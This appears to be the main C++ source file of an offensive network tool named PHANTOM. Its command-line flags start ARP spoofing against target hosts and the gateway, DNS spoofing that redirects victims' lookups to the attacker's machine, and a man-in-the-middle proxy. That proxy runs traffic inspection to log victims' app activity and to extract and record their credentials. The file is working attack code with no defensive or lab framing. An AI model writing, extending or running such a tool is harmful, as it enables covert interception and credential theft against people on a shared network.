#include "logger.h"
#include "types.h"
#include "config.h"
#include "network.h"
#include "arp_spoof.h"
#include "dns_spoof.h"
#include "proxy.h"
#include "device_tracker.h"
#include "dpi_engine.h"
#include <iostream>
#include <string>
#include <thread>
#include <csignal>
#include <atomic>

using namespace phantom;

namespace {
std::atomic<bool> g_shutdown{false};
void HandleSignal(int) { g_shutdown = true; }
} // namespace

int main(int argc, char** argv) {
    Logger::Instance().Init(LOG_DIR);
    LOG_INFO("PHANTOM booted");

    std::signal(SIGINT, HandleSignal);
    std::signal(SIGTERM, HandleSignal);

    std::string iface_name;
    std::vector<std::string> target_ips;
    bool want_arp = false, want_dns = false, want_proxy = false;
    bool want_dpi = false, want_creds = false, want_scan = false;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-i" && i + 1 < argc) {
            iface_name = argv[++i];
        } else if ((arg == "-t" || arg == "--target") && i + 1 < argc) {
            target_ips.push_back(argv[++i]);
        } else if (arg == "--arp") {
            want_arp = true;
        } else if (arg == "--dns") {
            want_dns = true;
        } else if (arg == "--proxy") {
            want_proxy = true;
        } else if (arg == "--dpi") {
            want_dpi = true;
        } else if (arg == "--creds") {
            want_creds = true;
        } else if (arg == "--scan") {
            want_scan = true;
        }
    }

    if (iface_name.empty()) {
        LOG_ERROR("No interface specified, pass one with -i <interface> (e.g. -i eth0)");
        return 1;
    }

    auto iface = NetworkManager::FindInterface(iface_name);
    if (!iface) {
        LOG_ERROR("Interface not found: " + iface_name);
        return 1;
    }

    Session& session = Session::Instance();
    session.running = true;
    session.config.interface_name = iface_name;
    session.config.local_ip = IPv4Address::FromString(iface->ip);
    session.config.local_mac = MacAddress::FromString(iface->mac);

    std::string gateway_ip_str = !iface->gateway.empty()
        ? iface->gateway : NetworkManager::GetDefaultGateway();
    if (!gateway_ip_str.empty()) {
        session.config.gateway_ip = IPv4Address::FromString(gateway_ip_str);
        session.config.gateway_mac = NetworkManager::GetMacForIp(iface_name, session.config.gateway_ip);
    }
    for (auto& t : target_ips) {
        session.config.target_ips.push_back(IPv4Address::FromString(t));
    }

    DeviceTracker& tracker = DeviceTracker::Instance();
    if (want_scan) {
        tracker.StartArpScan();
        LOG_SUCCESS("Device scanner started");
    }

    ArpSpoofer arp_spoofer;
    if (want_arp) {
        if (target_ips.empty()) {
            LOG_WARN("--arp requested but no --target <ip> given, skipping ARP spoofing");
        } else if (gateway_ip_str.empty()) {
            LOG_WARN("--arp requested but no gateway could be resolved, skipping ARP spoofing");
        } else {
            arp_spoofer.SetInterface(iface_name);
            arp_spoofer.SetGateway(session.config.gateway_ip, session.config.gateway_mac);
            for (auto& t : target_ips) {
                IPv4Address tip = IPv4Address::FromString(t);
                MacAddress tmac = NetworkManager::GetMacForIp(iface_name, tip);
                arp_spoofer.AddTarget(tip, tmac);
            }
            if (arp_spoofer.Start()) {
                LOG_SUCCESS("ARP spoofing started for " +
                            std::to_string(target_ips.size()) + " target(s)");
            } else {
                LOG_ERROR("Failed to start ARP spoofing");
            }
        }
    }

    DnsSpoofer dns_spoofer;
    if (want_dns) {
        dns_spoofer.SetInterface(iface_name);
        dns_spoofer.SetRedirectIp(iface->ip);
        if (dns_spoofer.Start()) {
            LOG_SUCCESS("DNS spoofing started (redirecting resolved names to " + iface->ip + ")");
        } else {
            LOG_ERROR("Failed to start DNS spoofing");
        }
    }

    MitmProxy proxy;
    if (want_proxy) {
        if (want_dpi || want_creds) {
            proxy.SetDpiCallback([want_dpi, want_creds](HttpTransaction& txn, const std::string& client_ip) {
                MacAddress mac = MacAddress::FromString(
                    NetworkManager::ArpLookup(IPv4Address::FromString(client_ip)));

                if (want_dpi) {
                    ParsedActivity activity = DpiEngine::Instance().AnalyzeTransaction(txn);
                    if (activity.app != AppType::UNKNOWN) {
                        Session::Instance().AddActivity(activity);
                        DeviceTracker::Instance().RecordActivity(activity, mac);
                        LOG_ACTIVITY(activity.app_label + " | " + activity.activity_label +
                                     " | " + client_ip);
                    }
                }

                if (want_creds) {
                    for (auto& cred : DpiEngine::Instance().ExtractCredentials(txn)) {
                        Session::Instance().AddCredential(cred);
                        DeviceTracker::Instance().RecordCredential(cred, mac);
                        LOG_CREDENTIAL(cred.service + " | " + cred.credential_type +
                                       " | " + client_ip);
                    }
                }
            });
        }
        if (proxy.Start()) {
            LOG_SUCCESS("MITM proxy listening on port " + std::to_string(PROXY_PORT));
        } else {
            LOG_ERROR("Failed to start MITM proxy");
        }
    }

    LOG_SUCCESS("PHANTOM ready");

    while (session.running && !g_shutdown) {
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }

    LOG_INFO("Shutting down...");
    session.running = false;

    if (want_scan) tracker.StopArpScan();
    if (proxy.IsRunning()) proxy.Stop();
    if (dns_spoofer.IsRunning()) dns_spoofer.Stop();
    if (arp_spoofer.IsRunning()) arp_spoofer.Stop();

    LOG_SUCCESS("PHANTOM stopped cleanly");
    return 0;
}
